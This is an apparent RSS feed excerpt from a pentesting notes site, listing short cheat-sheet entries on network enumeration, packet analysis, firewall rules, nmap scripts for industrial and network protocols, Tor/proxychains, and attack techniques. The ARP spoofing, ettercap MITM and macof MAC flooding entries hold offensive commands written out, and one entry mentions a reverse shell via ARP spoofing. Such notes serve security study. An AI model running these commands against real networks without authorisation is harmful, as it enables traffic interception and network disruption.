      <description>Enumerate Network linkAfter entering the target server, enumerate and search other networks.&#xA;Check the ARP Cache in Target Machine link arp.exe -a Check IP Addresses link Get-Content c:\Windows\System32\drivers\etc\hosts ipconfig /all Search Other Network Ranges linkNo content yet.</description>
    </item>
    <item>
      <title>Network Traffic Analysis (NTA)</title>
      <link>https://documentnation.github.io/docs/hdks/network/network-traffic-analysis/</link>
      <pubDate>Sun, 29 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/network-traffic-analysis/</guid>
      <description>Packet Analysis link wireshark example.pcap # Tcpdump sudo tcpdump -i eth0 icmp # output pcap file sudo tcpdump -i eth0 icmp -w /tmp/tcpdump.pcap Brim linkBrim is an application to search and analyze super-structured data.&#xA;brim sample.pcap Filters&#xA;_path==&amp;#34;http&amp;#34; &amp;#34;example.com&amp;#34; id.resp_p==80 | cut ts, host, id.resp_p, uri | sort ts # Find UserAgent in HTTP requests user_agent | cut _path,id.orig_h,id.resp_h,method,host,user_agent Snort linkSnort is a network intrusion detection system (NIDS) and intrusion prevention system (NIPS).</description>
    </item>
    <item>
      <title>EthernetIP Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/eternetip-pentesting/</link>
      <pubDate>Fri, 27 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/eternetip-pentesting/</guid>
      <description>Enumeration link nmap --script enip-info -p 44818 &amp;lt;target-ip&amp;gt; </description>
    </item>
    <item>
      <title>Modbus Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/modbus-pentesting/</link>
      <pubDate>Fri, 06 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/modbus-pentesting/</guid>
      <description>Enumeration link nmap --script modbus-discover --script-args modbus-discover.aggressive=true -p 502 &amp;lt;target-ip&amp;gt; </description>
    </item>
    <item>
      <title>Firewall</title>
      <link>https://documentnation.github.io/docs/hdks/network/firewall/</link>
      <pubDate>Sun, 11 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/firewall/</guid>
      <description>Status link ufw status ufw status verbose Enable/Disable the Firewall link ufw enable ufw disable Set Default Policies link # Allow all ufw default ALLOW # Deny all ufw default DENY Rules link Allow&#xA;ufw allow 22 ufw allow 22/tcp ufw allow 80 ufw allow 80/tcp # Allow the given ip address access to port 22 for all protocols ufw allow from &amp;lt;ip&amp;gt; to any port 22 Deny&#xA;ufw deny 22 ufw deny 22/tcp ufw deny 80 ufw deny 80/tcp </description>
    </item>
    <item>
      <title>Dynamic Host Configuration Protocol (DHCP) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/dhcp-pentesting/</link>
      <pubDate>Sat, 10 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/dhcp-pentesting/</guid>
      <description>Enumeration link nmap -sU --script broadcast-dhcp-discover -p 67,68 &amp;lt;target-ip&amp;gt; </description>
    </item>
    <item>
      <title>MITM (Man in the Middle) Attack</title>
      <link>https://documentnation.github.io/docs/hdks/network/wifi/mitm-attack/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/wifi/mitm-attack/</guid>
      <description>Establish MITM linkUsing ARP Spoofing linkIn the target machine,&#xA;# -T: text only GUI # -M: man-in-the-middle attack # -w: write .pcap file ettercap -T -i eth1 -M arp -w /tmp/ettercap.pcap ettercap -T -i eth1 -M arp -w /tmp/ettercap.pcap In your local machine, transfer the ettercap&amp;rsquo;s output file.&#xA;scp victim@&amp;lt;target-ip&amp;gt;:/tmp/ettercap.pcap . # Investigate the file wireshark ettercap.pcap Gain Access to a Shell linkReverse Shell Via ARP Spoofing linkIn the target machine, create &amp;ldquo;whoami.</description>
    </item>
    <item>
      <title>NTP (Network Time Protocol) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/ntp-pentesting/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/ntp-pentesting/</guid>
      <description>Enumeration link nmap -sU --script ntp-info -p 123 &amp;lt;target-ip&amp;gt; nmap -sU --script ntp-monlist -p 123 &amp;lt;target-ip&amp;gt; nmap -sU --script ntp* -p 123 &amp;lt;target-ip&amp;gt; nmap -sU --script &amp;#34;ntp* and (discovery or vuln) and not (dos or brute)&amp;#34; -p 123 &amp;lt;target-ip&amp;gt; Ntpq link ntpq -c readlist &amp;lt;target-ip&amp;gt; ntpq -c readvar &amp;lt;target-ip&amp;gt; ntpq -c peers &amp;lt;target-ip&amp;gt; ntpq -c associations &amp;lt;target-ip&amp;gt; ntpdc -c monlist &amp;lt;target-ip&amp;gt; ntpdc -c listpeers &amp;lt;target-ip&amp;gt; ntpdc -c sysinfo &amp;lt;target-ip&amp;gt; </description>
    </item>
    <item>
      <title>Tor</title>
      <link>https://documentnation.github.io/docs/hdks/network/tor/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/tor/</guid>
      <description>Install Tor link sudo apt install tor Start/Restart/Stop Tor Service link # Start sudo service tor start # Restart sudo service tor restart # Stop sudo service tor stop # Status sudo service tor statur Proxychains linkProxychains forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy.&#xA;configuration&#xA;vim /etc/proxychains.conf # ----------------------------------------------------- # If performing nmap for port scan through proxychains, comment out the following.</description>
    </item>
    <item>
      <title>ARP (Address Resolution Protocol) Spoofing</title>
      <link>https://documentnation.github.io/docs/hdks/network/arp-spoofing/</link>
      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/arp-spoofing/</guid>
      <description>Basic Flow link Check Interface and Gateway IP Address&#xA;# Interfaces ip addr # Default gateway ip route list Scan the Network to Find Target IP&#xA;nmap -sP &amp;lt;gateway-ip&amp;gt;/24 nmap -sP &amp;lt;gateway-ip&amp;gt;/16 Enable IP Forwarding&#xA;# Allow all forwading in the LAN # -A: append rules # -i: interface # -j: jump iptables -A FORWARD -i eth0 -j ACCEPT Find MAC Address link cat /sys/class/net/eth0/address cat /sys/class/net/enp0s3/address cat /sys/class/net/tun0/address </description>
    </item>
    <item>
      <title>Bluetooth Hacking</title>
      <link>https://documentnation.github.io/docs/hdks/network/bluetooth/bluetooth-hacking/</link>
      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/bluetooth/bluetooth-hacking/</guid>
      <description>BlueBorne linkA type of attack in which a Bluetooth-enabled device hijacks another Bluetooth device to send spam advertising.</description>
    </item>
    <item>
      <title>MAC Flooding Attack</title>
      <link>https://documentnation.github.io/docs/hdks/network/mac-flooding-attack/</link>
      <pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/mac-flooding-attack/</guid>
      <description>Attack Flow link Open Two SSH Sessions&#xA;Start the SSH session 1 in terminal 1.&#xA;ssh victim@&amp;lt;target-ip&amp;gt; Start the SSH session 2 in terminal 2.&#xA;Flood the Switch and Capturing the Traffic&#xA;In the session 1, start tcpdump and keep it running.&#xA;tcpdump -A -i eth1 -w /tmp/tcpdump.pcap In the session 2, start flooding the switch (here &amp;ldquo;eth1&amp;rdquo; interface).&#xA;macof -i eth1 After about 30 seconds, stop macof and tcpdump.</description>
    </item>
    <item>
      <title>Networking</title>
      <link>https://documentnation.github.io/docs/hdks/network/networking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/networking/</guid>
      <description>Network Connection linkStatus link netstat # -t: tcp, -u: udp, -l: listen, -p: programs, -n: don&amp;#39;t resolve names netstat -lnptu # -r: route netstat -rn Connectivity of Hosts link ping &amp;lt;target-ip&amp;gt; # Stop after 5 times ping -c 5 &amp;lt;target-ip&amp;gt; # No DNS resolution ping -n 3 &amp;lt;target-ip&amp;gt; Trace Route Path Between Two Nodes link traceroute &amp;lt;target-ip&amp;gt; Investigate Packets/Traffic link ICMP&#xA;Check the status of network connections between nodes.&#xA;Start Tcpdump</description>
    </item>
    <item>
      <title>WASTE Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/waste-pentesting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/waste-pentesting/</guid>
      <description>Connect link connect &amp;lt;target-ip&amp;gt; 1337 # or nc &amp;lt;target-ip&amp;gt; 1337 </description>
    </item>
  </channel>
</rss>
